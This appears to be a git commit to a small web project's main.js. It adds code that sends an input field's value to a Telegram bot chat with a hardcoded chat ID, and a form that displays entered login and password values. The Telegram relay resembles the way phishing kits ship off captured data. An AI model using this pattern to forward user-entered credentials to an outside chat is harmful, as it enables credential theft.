41ecde65e049a8e80b9e1c65da490a8b6a3741a3
GurnikVitaliy <111244081+GurnikVitaliy@users.noreply.github.com>
2023-07-17 23:53:10 +0300

    Update main.js

--- main.js
+++ main.js
@@ -42,3 +42,31 @@ btn2.addEventListener('click', () => {
     },5000)
  })
  const printt = document.querySelector('.print');
+
+
+
+ let inp1 = input.value;
+    const url = 'https://api.telegram.org/bot'+token1+'/sendMessage?chat_id=1201316750&text=';
+    let xttp = new XMLHttpRequest();
+
+    xttp.open("GET", url+inp1);
+    xttp.send();
+
+})
+
+
+btn1.addEventListener('click', () => {
+    const input1 = document.querySelector('#input1');
+    const input2 = document.querySelector('#input2');
+
+    let inp1 = input1.value,
+        inp2 = input2.value;
+
+    out1.innerHTML = `login : <b> ${inp1} </b>`;
+    out2.innerHTML = `password : <b> ${inp2} </b>`; 
+
+    input1.value = '';
+    input2.value = '';
+})
+
+console.log('hello');
